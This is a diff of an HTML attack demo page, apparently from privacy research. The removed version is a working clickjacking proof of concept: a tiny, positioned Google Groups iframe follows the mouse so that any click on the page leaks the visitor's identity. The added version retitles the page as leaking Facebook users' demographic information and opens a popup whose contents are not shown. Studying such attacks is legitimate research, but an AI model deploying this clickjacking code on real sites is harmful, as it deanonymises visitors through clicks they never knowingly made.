@@ -1,34 +1,17 @@
 <html>
 	<head>
-		<title>Clickjacking</title>
+		<title>Leaking Facebook user's demographich-based private information</title>
 		<script>
-			onmousemove = (e) => {
-			  var x = e.clientX;
-			  var y = e.clientY;
-
-			  document.getElementById("iframe1").style.top  = y;
-			  document.getElementById("iframe1").style.left = x;
-
+			openWin = () => {
+				open("second.html", '', "top=200, left=200")
 			}
 		</script>
 	</head>
 	<body>
 		<br><br>
 		<center>
-			<h1>Click anywhere on the page and your identity will be leaked.</h1>
+			<h1>Click on the button below to leak your Facebook's user demographic-based information.</h1>
+			<button type="button" onclick="openWin()">Click here!</button>
 		</center>
-
-		<div id="iframe1" style="overflow: hidden; width: 22px; height: 10px; position: absolute;">
-			<iframe id="forum_embed" style="border: 0pt none ; left: -53px; top: -87px; position: absolute; width: 1920px; height: 969px;" src="javascript:void(0)" scrolling="no" frameborder="0" width="900" height="700"> </iframe>
-		</div>
-
-		<script type="text/javascript">
-			document.getElementById('forum_embed').src =
-			 'https://groups.google.com/forum/embed/?place=forum/testdorobot'
-			 + '&showsearch=true&showpopout=true&showtabs=false'
-			 + '&parenturl=' + encodeURIComponent(window.location.href);
-		</script>
-
-		</div>
 	</body>
 </html>
